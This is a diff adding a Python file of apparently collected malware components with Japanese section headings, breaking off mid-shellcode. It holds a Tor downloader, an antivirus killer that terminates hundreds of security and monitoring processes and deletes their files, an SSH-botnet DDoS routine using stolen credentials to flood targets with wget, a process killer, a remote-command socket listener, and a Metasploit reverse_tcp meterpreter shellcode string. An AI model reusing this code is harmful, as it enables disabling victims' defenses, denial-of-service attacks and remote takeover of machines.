@@ -1,0 +1,562 @@
+[Torダウンロード]
+orURL = "https://dist.torproject.org/torbrowser/4.5.3/tor-win32-0.2.6.9.zip"
+torSHA256 = "8d2eda25e32328962c77a829f039a326226fb6c82e658b8cc38b6cfd8d996320"
+def downloadTor(outputFolder):
+    while True:
+        doBreak=False
+        try:
+            data = urlopen(torURL).read()
+            req = Request(torURL)
+            req.add_unredirected_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0")
+            data = urlopen(req).read()
+            del(req)
+            with open(outputFolder+"tor.zip", "wb") as code:
+                code.write(data)
+            with open(outputFolder+"tor.zip", "r") as code:
+                if gethash(code.read()) == torSHA256:
+                    sourceZip = ZipFile(outputFolder+"tor.zip", 'r')
+                    for name in sourceZip.namelist():
+                        sourceZip.extractall(outputFolder)
+                    sourceZip.close()
+                    doBreak=True
+            remove(outputFolder+"tor.zip")
+        except:
+            pass
+        if doBreak == True:
+            break
+        else:
+            if path.isfile(outputFolder+"tor.zip"):
+                try:
+                    remove(outputFolder+"tor.zip")
+                except:
+                    pass
+
+[Torが起動しているか確認]
+def torwatch():
+    while doProtect == True:
+        if not IsProcessRunning("tor.exe"):
+            runTor=True
+            if path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe"):
+                if path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe:Zone.Identifier"):
+                    try:
+                        remove(getenv("APPDATA")+installDir+"\\Tor\\tor.exe:Zone.Identifier")
+                    except:
+                        pass
+                try:
+                   startfile(getenv("APPDATA")+installDir+"\\"+torProc)
+                except:
+                    pass
+        sleep(25)
+
+[アンチウイルスソフトkill]
+def advavkiller():
+    avprocs = ["rstrui", "n360", "avg", "avira", "patch", "clam", "superantispyware", "avg", "fsav", "fpav", "bullguard", "rkill", "teatimer", "avp", "regcure", "optimizer", "n360", "norton", "zonealarm", "wsbgate", "winsfcm",
+               "adaware", "bluepoint", "nod32", "avast", "mbam", "bd_professional", "guard", "guarddog", "scan", "recovery", "psctrls", "tmccs", "pccnt", "ntrt", "tmpfw", "wyvernworksfirewall",
+               "tmbm", "uise", "asmp", "ofcaos", "ircrc", "smex", "pcctl", "ofcpfw", "ntrt", "hvr", "sbam", "instzlh", "asoelnch", "restore", "neux", "sevinst", "minilog", "wnt", "wimmun32",
+               "symdgn", "Symerr", "avmgma", "sysimins", "tuih", "adv", "gcasDtServ", "aavg", "avupgsvc", "maagent", "bdi", "bdbad", "Avch", "gzserv", "ccuac", "avwsc", "avweb", "winrecon",
+               "mfev", "mfeann", "avcenter", "Avconfig", "avnotify", "avrestart", "avshadow", "avscan", "avg", "fsb", "fsd", "fsg", "fssm", "UpdClient.exe", "ccapp", "zatutor", "wradmin",
+               "avss", "fsh", "fsor", "kav", "security", "anti-trojan", "clam", "avnt", "protectx", "f-agnt", "virusmadpersonalfirewall", "spyxx", "avw", "exantivirus", "winroute",
+               "regcure", "_avp", "agent", "firewall", "armor", "antivirus", "esafe", "f-prot", "norton", "optimizer", "avconfig", "avscan", "instup", "zauinst", "wrctrl", "wqkmm3878",
+               "hijackthis", "spybot", "ash", "ccuac", "avcenter", "egui", "egui", "zlclient", "bdagent", "keyscrambler", "avp", "wireshark", "tcpdump", "tshark", "whoswatchingme",
+               "combofix", "msas", "mpcmdrun", "msseces", "msmpeng", "blindman", "sdfiles", "sdmain", "sdwinsec", "mghtml", "MsiExec", "outpost", "isafe", "zapro", "wgfe95", "wfindv32", "webtrap", "ccsetmgr", "ccsetmgr",
+               "ccevtmgr", "Norton Auto-Protect", "cccproxy", "navw32", "norton", "navapsvc", "npfmntor", "logexprt", "nisum", "issvc", "cpdclnt", "pccntupd", "PCCTool", "tmproxy", "tmntsrv",
+               "pop3trap", "tsc", "PavPrSrv", "padmin", "PavProt", "pandaav", "avengine", "apvxdwin", "webProxy", "avguard", "avgnt", "sched", "avsched32", "SCCOMM", "Spiderml", "vsserv",
+               "bdswitch", "bdss", "INOTask", "caissdt", "InoRpc", "VetMsg", "vettray", "realmon", "nod32krn", "nod32", "nod32kui", "kav", "kavmm", "KAVPF", "avgemc", "avgcc", "avgamsvr", "avgupsvc", "avgw",
+               "ashWebSv", "ashDisp", "ashmaisv", "ashserv", "aswupdsv", "ewidoctrl", "guard", "gcasDtServ", "MsMpEng", "mcafee", "mghtml", "MsiExec", "outpost", "isafe", "zapro", "zauinst",
+               "UpdClient", "zlcliente", "minilog", "zonealarm", "zlclient", "ccapp", "AVGCtrl", "CSS_1630", "CSS-AVS", "AVGCC32", "AVGServ", "AVGServ9", "ewidoguard", "kavsvc", "MPFAgent", "MPFTray",
+               "Mscifapp", "MSKSrvr", "PavPrS9x", "Nprotect", "Nsched32", "SymWSC", "mghml", "shed", "sgmain", "spywareguard", "kpf4gui", "kpf4ss", "mcdash", "mcdetect", "mcregwiz", "mcinfo",
+               "oasclnt", "mpfconsole", "mpfservice", "mpfwizard", "mvtx", "_avp32", "_avpcc", "_avpm", "ackwin32", "advxdwin", "agentsvr", "agv", "ahnsd", "alertsvc", "alogserv", "amon", "amon9x", "amonavp32",
+               "anti -trojan", "antivir", "antivirus", "ants", "antssircam", "apimonitor", "aplica32", "atcon", "atguard", "ats", "atscan", "atupdater", "atwatch", "autodown", "autotrace", "autoupdate",
+               "ave32", "avgserv9schedapp", "avkpop", "avkserv", "avkservice", "avkwcl9", "avkwctl9", "avnt", "avp", "avp32", "avpcc", "AVPCC Service", "avpccavpm", "avpdos32", "avpexec",
+               "avpinst", "avpm", "avpmonitor", "avptc", "avptc32", "avpupd", "avpupdates", "avrescue", "avsynmgr", "avwin95", "avwinnt", "avwupd32", "avxgui", "avxinit", "avxlive",
+               "avxmonitor9x", "avxmonitornt", "avxnews", "avxquar", "avxsch", "avxw", "BACKLOG", "bd_professional", "bidef", "bidserver", "bipcp", "bisp", "blackd", "blackice", "blackiceblackd",
+               "avconsol", "BootWarn", "borg2", "bs120", "bullguard", "ccIMScan", "ccPwdSrc", "ccpxysvc", "cdp", "cfiadmin", "cfiaudit", "cfinet", "cfinet32", "claw95", "claw95cf", "clean",
+               "cleaner", "cleaner3", "cleanpc", "cmgrdian", "cmon016", "codered", "connectionmonitor", "conseal", "cpd", "cpf9x206", "ctrl", "defalert", "defence", "defense", "defscangui",
+               "defwatch", "deputy", "doors", "dpf", "drwatson", "drweb32", "dvp95", "dvp95_0", "ecengine", "edisk", "efpeadm", "esafe", "escanh95", "escanhnt", "escanv95", "espwatch", "etrustcipe",
+               "evpn", "exantivirus", "fameh32", "fast", "fch32", "fih32", "findviru", "firewall", "fix-it", "flowprotector", "fnrb32", "fp -win", "fp -win_trial", "fprot", "frw", "fsaa", "fsav32",
+               "fsav95", "fsave32", "fsgk32", "fsm32", "fsma32", "fsmb32", "fwenc", "gbmenu", "gbpoll", "gedit", "generics", "grief3878", "guarddog", "HackerEliminator", "iamapp", "iamserv",
+               "iamstats", "ibmasn", "ibmavsp", "icload95", "icloadnt", "icmon", "icsupp95", "icsuppnt", "iface", "ifw2000", "inoculateit", "iomon98", "iparmor", "iris", "isrv95", "jammer", "jedi", "ldnetmon",
+               "ldpromenu", "ldscan", "localnet", "lockdown", "lookout", "luall", "lucomserver", "luspt", "mcagent", "mcmnhdlr", "mcshield", "mcshieldvvstat", "mctool", "mcupdate", "mcvsrte", "mcvsshld",
+               "mgavrtcl", "mgavrte", "mgui", "mon", "monitor", "monsys32", "monsysnt", "moolive", "mrflux", "msinfo32", "mwatch", "mxtask", "n32scanw", "nav", "NAV DefAlert", "nav32", "navalert",
+               "navap", "NAVAPW32", "navauto -protect", "navdx", "navengnavex15", "navlu32", "navnt", "navrunr", "navstub", "Navwnt", "nc2000", "ndd32", "neomonitor", "neowatchlog", "net2000",
+               "netarmor", "netcommando", "netinfo", "netmon", "netpro", "netprotect", "netscanpro", "netspyhunter -1.2", "netstat", "netutils", "netutils]", "nimda", "nisserv", "nisumnisservnisum",
+               "nmain", "norman", "norman_32", "norman_av", "norman32", "normanav", "normist", "norton_av", "nortonav", "notstart", "npfmessenger", "npfw", "npfw32", "npscheck", "npssvc", "nresq32", "nschednt",
+               "nsplugin", "ntrtscan", "ntvdm", "ntxconfig", "nui", "nupgrade", "nvarch16", "nvc95", "nvsvc32", "nwservice", "nwtool16", "offguard", "OPScan", "ostronet", "panda", "panixk", "pav", "pavcl", "pavproxy",
+               "pavsched", "pavw", "pc -cillan", "pc -cillin", "pccclient", "pccguide", "pcciomon", "pccntmon", "pccwin97", "pccwin98", "pcfwallicon", "pcscan", "periscope", "persfw", "pf2", "pfwadmin", "pingscan",
+               "platin", "poproxy", "portdetective", "portmonitor", "ppinupdt", "pptbc", "ppvstop", "processmonitor", "procexplorerv10", "programauditor", "proport", "protectx", "pspf", "purge",
+               "pview95", "pw32", "qconsole", "rav", "rav7", "rav7win", "regrun2", "rescue", "rrguard", "rshell", "rtvscn95", "rulaunch", "safeweb", "SAVscan", "sbserv", "SBservice", "scan", "scan32",
+               "scan95", "scanpm", "scrscan", "sd", "SENS", "serv95", "sfc", "sh", "sharedaccess", "shn", "smc", "sofi", "sophos", "sophos_av", "sophosav", "spf", "sphinx", "spy", "spygate", "spyx", "spyxx",
+               "srwatch", "ss3edit", "st2", "supftrl", "supp95", "supporter5", "sweep95", "sweepnet", "sweepsrv.sys", "sweepsrv.sysvshwin32", "swnetsup", "symantec", "Symantec Core LC", "symproxysvc", "symtray",
+               "sysedit", "taskmon", "taumon", "tauscan", "tbscan", "tcm", "tctca", "tds -3", "tds2 -98", "tds2 -nt", "tfak", "tfak5", "tgbob", "trendmicro", "trjscan", "trojantrap3", "TrueVector", "undoboot",
+               "vbcmserv", "vbcons", "vbust", "vbwin9x", "vbwinntw", "vccmserv", "vcontrol", "vet32", "vet95", "vir -help", "virus", "virusmdpersonalfirewall", "vnlan300", "vnpc3000", "vpc32", "vpfw30s",
+               "vptray", "vscan40", "vsched", "avifil32", "vsecomr", "vshwin32", "vshwin32vbcmserv", "vsmain", "vsmon", "vsstat", "vswin9xe", "vswinntse", "w9x", "watchdog", "webscanx"]
+    while doProtect == True:
+        sleep(420)
+        try:
+            KillProcessandFileList(avprocs)
+        except:
+            pass
+        if path.isfile("\\Documents and Settings\\All Users\\Desktop\\Immunet"):
+            sleep(1)
+            try:
+                remove("\\Documents and Settings\\All Users\\Desktop\\Immunet")
+            except:
+                pass
+        programfiles = [ "\\Program Files\\", "\\Program Files (x86)\\" ]
+        avastdirs = ["Emsisoft Anti-Malware",
+                     "Symantec",
+                     "BluePoint Security",
+                     "NortonInstaller",
+                     "Norton 360",
+                     "Norman",
+                     "FRISK Software",
+                     "norman",
+                     "Bitdefender",
+                     "Trend Micro",
+                     "TrustPort",
+                     "escan",
+                     "AVG",
+                     "CheckPoint",
+                     "Kaspersky Lab",
+                     "Webroot",
+                     "Panda Security",
+                     "Panda Software",
+                     "Sunbelt Software",
+                     "McAfee",
+                     "Malwarebytes Anti-Malware",
+                     "Optimizer Pro",
+                     "AVAST Software",
+                     "Wireshark",
+                     "ImmunetSUPERAntiSpyware",
+                     "CyberDefender",
+                     "Avira",
+                     "ViRobot",
+                     "hauri",
+                     "Hauri",
+                     "Windows Defender",
+                     "MarkAnyLavasoft",
+                     "avifil342.exe",
+                     "ParetoLogic"] 
+        for avastdir in avastdirs:
+            for programfile in programfiles:
+                if path.isdir(programfile+avastdir):
+                    sleep(1)
+                    if "Sunbelt Software" == avastdir:
+                        dirs= [
+                            "\\Documents and Settings\\All Users\\Application Data\\Sunbelt\\AntiMalware",
+                            "\\Documents and Settings\\"+getuser()+"\\Application Data\\Sunbelt\\AntiMalware",
+                            "\\ProgramData\\"+getuser()+"\\AntiMalware",
+                            getenv("APPDATA")+"\\Sunbelt",
+                            "\\Users\\All Users\\Sunbelt\\AntiMalware",
+                            "\\Windows\\System32\\sbbd.exe",
+                            "\\Windows\\System32\\Drivers\\sbaphd.sys",
+                            "\\Windows\\System32\\Drivers\\sbapifs.sys",
+                            "\\Windows\\System32\\Drivers\\SBREDrv.sys",
+                            "\\Windows\\System32\\Drivers\\sbtis.sys"
+                            ]
+                        for adir in dirs:
+                            if "." in adir:
+                                try:
+                                    remove(adir)
+                                except:
+                                     pass
+                            else:
+                                try:
+                                    rmtree(adir)
+                                except:
+                                    pass
+                            sleep(1)
+                    elif "Webroot" == avastdir:
+                        adel = [
+                            "\\Documents and Settings\\All Users\\Application Data\\WRData",
+                            "\\ProgramData\\WRData",
+                            "\\Documents and Settings\\"+getuser()+"\\Application Data\\Mozilla\\Firefox\\Profiles\\*\\extensions\\{8ac62a8b-8b3f-43ba-9b1a-90c299b9dfda}",
+                            "\\Users\\"+getuser()+"\\AppData\\roaming\\Mozilla\\Firefox\\Profiles\\*\\extensions\\{8ac62a8b-8b3f-43ba-9b1a-90c299b9dfda}",
+                            "\\Documents and Settings\\"+getuser()+"\\Local Settings\\Application Data\\Webroot",
+                            "\\Users\\"+getuser()+"\\AppData\\Local\\Webroot",
+                            "\\Windows\\System32\\WRusr.dll",
+                            "\\Windows\\SysWow64\\WRusr.dll",
+                            "\\Windows\\System32\\Drivers\\WRKrn.sys"
+                            ]
+                        for dlr in adel:
+                            if "." in dlr:
+                                try:
+                                    remove(dlr)
+                                except:
+                                    pass
+                            else:
+                                try:
+                                    rmtree(dlr)
+                                except:
+                                    pass
+                    elif "ParetoLogic" == avastdir:
+                        try:
+                            remove(getenv("APPDATA")+"\\nPSWF32.dll")
+                        except:
+                            pass
+                        sleep(1)
+                        try:
+                            remove(getenv("APPDATA")+"\\Protector-")
+                        except:
+                            pass
+                        sleep(1)
+                        try:
+                            remove(getenv("APPDATA")+"\\result.db")
+                        except:
+                            pass
+                        sleep(1)
+                    elif "MarkAny" == avastdir:
+                        sleep(1)
+                        try:
+                            rmtree(programfile+avastdir)
+                        except:
+                            pass
+                    sleep(1)
+start_new_thread(advavkiller, ())
+start_new_thread(advbotkiller, ())
+start_new_thread(regedit, ())
+sleep(5)
+
+
+
+[ユーザーエージェントリスト]
+useragents = [
+ "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
+ "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
+ "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
+ "Opera/9.20 (Windows NT 6.0; U; en)",
+ "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
+ "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
+ "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
+ "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
+ "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
+ "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
+ "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
+ "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
+ "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
+ "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
+ "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+ "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+ "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
+ "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
+ "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
+ "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
+ "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+ "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
+ "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
+ "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; da-dk) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
+ "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
+ "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
+ "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
+ "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
+ "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
+ "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
+ "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
+ "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
+ "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
+ "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
+ "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
+ "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
+ "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
+ "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
+ "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
+ "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
+ "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
+ "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
+ "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
+ "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
+ "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
+ "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
+ "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36",
+ "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36",
+ "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36",
+ "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36",
+ "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",
+ "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)"
+]
+
+
+[DDoS]
+def ddos(command, server, port, user, password, processes):
+    try:
+        ssh = SSHClient()
+        ssh.set_missing_host_key_policy(AutoAddPolicy())
+        ssh.connect(server, port=port, username=user, password=password, timeout=35)
+        if processes < 1:
+            processes=1
+        for x in range(0,processes):
+            newcommand=command
+            if "%rand%" in newcommand:
+                newcommand = newcommand.replace("%rand%", str(randrange(0,25565)))
+            if "%useragent%" in newcommand:
+                newcommand = newcommand.replace("%useragent%", choice(useragents))
+            if "wget" in newcommand:
+                ssh.exec_command(newcommand.replace("wget", "wget1"))
+            ssh.exec_command(newcommand)
+            if "STOPDDOS" == newcommand:
+                apps = [ "wget", "ping", "sh", "bash" ]
+                killtools = [ "killall", "pkill" ]
+                for app in apps:
+                    for killtool in killtools:
+                        ssh.exec_command(killtool+" "+app)
+                        ssh.exec_command("/usr/bin/"+killtool+" "+app)
+                        ssh.exec_command("/bin/"+killtool+" "+app)
+                        ssh.exec_command("/sbin/"+killtool+" "+app)
+                        ssh.exec_command("/usr/sbin"+killtool+" "+app)
+        ssh.close()
+    except:
+        pass
+def sshDDoS(mode, server, processes):
+    command=""
+    if mode == 1:
+        if not "http://" in server.lower() and not "ftp://" in server.lower() and not "ftps://" in server.lower() and not "https://" in server.lower():
+            server="http://"+server
+        if not server.endswith("/"):
+            server = server + "/"
+        command="while true; do wget "+server+" -O /dev/null -U "%useragent%" 2> /dev/null; done"
+    elif mode == 2:
+        command="STOPDDOS"
+    elif mode == 3:
+        command = "ping " + server + " -i 1 > /dev/null &"
+    if path.isfile(getenv("APPDATA")+sshdsAppDataFolder+sshdsFile):
+        f = open(getenv("APPDATA")+sshdsAppDataFolder+sshdsFile, "r")
+        roots = f.read()
+        f.close()
+        roots = roots.split()
+        for host in roots:
+            server=""
+            port=22
+            user=""
+            password=""
+            try:
+                user=b64decode(host).split(":")[0]
+            except:
+                pass
+            try:
+                password=b64decode(host).split(":")[1]
+            except:
+                pass
+            try:
+                server=b64decode(host).split(":")[2]
+            except:
+                pass
+            try:
+                port=int(b64decode(host).split(":")[3])
+            except:
+                pass
+            while 1:
+                worked=False
+                try:
+                    start_new_thread(ddos, (command, server, port, user, password, processes))
+                    worked=True
+                except:
+                    pass
+                if worked == True:
+                    break
+
+
+[base58エンコード&&デコード]
+__b58chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
+__b58base = len(__b58chars)
+
+def b58encode(v):
+  """ encode v, which is a string of bytes, to base58.                                                                                                               
+  """
+
+  long_value = 0L
+  for (i, c) in enumerate(v[::-1]):
+    long_value += (256**i) * ord(c)
+
+  result = ''
+  while long_value >= __b58base:
+    div, mod = divmod(long_value, __b58base)
+    result = __b58chars[mod] + result
+    long_value = div
+  result = __b58chars[long_value] + result                                                                                                                
+  nPad = 0
+  for c in v:
+    if c == '\0': nPad += 1
+    else: break
+
+  return (__b58chars[0]*nPad) + result
+
+
+
+def b58decode(v, length):
+  long_value = 0L
+  for (i, c) in enumerate(v[::-1]):
+    long_value += __b58chars.find(c) * (__b58base**i)
+
+  result = ''
+  while long_value >= 256:
+    div, mod = divmod(long_value, 256)
+    result = chr(mod) + result
+    long_value = div
+  result = chr(long_value) + result
+
+  nPad = 0
+  for c in v:
+    if c == __b58chars[0]: nPad += 1
+    else: break
+
+  result = chr(0)*nPad + result
+  if length is not None and len(result) != length:
+    return None
+
+  return result
+
+
+[プロセスkill]
+def killProcessandFile(process_name):
+    pythoncom.CoInitialize()
+    c = wmi.WMI()
+    for process in c.Win32_Process():
+        try:
+            if process_name.lower() in process.Name.lower():
+                handle = OpenProcess(PROCESS_ALL_ACCESS,False, process.ProcessId)
+                exe = GetModuleFileNameEx(handle, 0)
+                if exe.lower().startswith(process.Name.lower()+".exe"):
+                    process.Terminate()
+                    remove(exe)
+        except:
+            pass
+
+            
+def KillProcessandFileList(process_list):
+    pythoncom.CoInitialize()
+    c = wmi.WMI()
+    for process in c.Win32_Process():
+        sleep(5)
+        for botproc in process_list:
+            try:
+                if botproc.lower() in process.Name.lower():
+                    handle = OpenProcess(PROCESS_ALL_ACCESS,False, process.ProcessId)
+                    exe = GetModuleFileNameEx(handle, 0)
+                    if exe.lower().startswith(process.Name.lower()+".exe"):
+                        process.Terminate()  
+                        remove(exe)
+            except:
+                pass
+
+
+# kill certain processes
+def kill_proc(port,flag):
+    proc=subprocess.Popen("netstat -antp | grep '%s'" % (port), shell=True, stdout=subprocess.PIPE)
+    stdout_value=proc.communicate()[0]
+    a=re.search("\d+/%s" % (flag), stdout_value)
+    if a:
+        b=a.group()
+        b=b.replace("/%s" % (flag),"")
+        subprocess.Popen("kill -9 %s" % (b), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+
+
+
+
+[フォルダコピー]
+def copyfolder(sourcePath, destPath):
+    for root, dirs, files in os.walk(sourcePath):
+
+        dest = destPath + root.replace(sourcePath, '')
+
+        if not os.path.isdir(dest):
+            os.mkdir(dest)
+
+        for f in files:
+            oldLoc = root + '/' + f
+            newLoc = dest + '/' + f
+
+            if not os.path.isfile(newLoc):
+                try:
+                    shutil.copy2(oldLoc, newLoc)
+                except IOError:
+                    pass
+
+
+[ソケット受け付ける]
+def socket_listener(port):
+    port = int(port)
+    host = ''
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((host, port))
+    print "Listening on 0.0.0.0:%s" % str(port)
+    s.listen(1000)
+    conn, addr = s.accept()
+    print 'Connected by', addr
+    data = conn.recv(1024)
+
+    while 1:
+        command = raw_input("Enter shell command or quit: ")
+        conn.send(command)
+        if command == "quit": break
+        data = conn.recv(1024)
+        print data
+    conn.close()
+
+
+[シェルコード作成]
+def metasploit_shellcode(payload, ipaddr, port):
+
+    # if we are using reverse meterpreter tcp
+    if payload == "windows/meterpreter/reverse_tcp":
+        shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x